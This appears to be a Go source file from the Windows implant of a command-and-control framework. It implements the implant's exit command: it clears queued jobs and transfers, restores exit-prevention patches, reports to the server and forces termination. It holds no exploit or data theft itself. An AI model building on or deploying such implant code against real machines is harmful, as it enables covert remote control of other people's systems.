// server/docker/payloads/Windows/action_exit.go
//go:build windows
// +build windows

package main

import (
	"os"
	"runtime"
	"time"
)

type QuitMsg struct{}

func (c *QuitMsg) execute(ctx *OpCtx, args []string) OpResult {
	// Clean up active jobs
	commandQueue.mu.Lock()
	// Clean up downloads
	for filename, download := range commandQueue.activeDownloads {
		download.InProgress = false
		delete(commandQueue.activeDownloads, filename)
	}
	// Clean up uploads
	for filename := range commandQueue.activeUploads {
		delete(commandQueue.activeUploads, filename)
	}
	// Mark all jobs as inactive
	for id, job := range commandQueue.activeJobs {
		job.Active = false
		commandQueue.activeJobs[id] = job
	}
	commandQueue.mu.Unlock()

	// Check if we need to restore exit patches on Windows
	if runtime.GOOS == "windows" && exitMethodsPatched && exitPrevention != nil {
		// removed debug log
		// Call restoreAll directly - it will be a no-op on non-Windows
		if err := exitPrevention.restoreAll(); err != nil {
		}
		exitMethodsPatched = false
		// removed debug log
	}

	// Let the server know we're exiting
	result := OpResult{
		Output:      Succ(S5),
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}

	// Schedule the actual exit after we return the result
	go func() {
		time.Sleep(2 * time.Second)

		// Try normal exit first
		os.Exit(0)

		// If we're still here after a moment, try platform-specific termination
		time.Sleep(1 * time.Second)

		if runtime.GOOS == "windows" {
			// On Windows, we'll try a force terminate
			// This will be handled by a Windows-specific function
			forceTerminateWindows()
		}

		// Last resort - panic
		panic(E25)
	}()

	return result
}
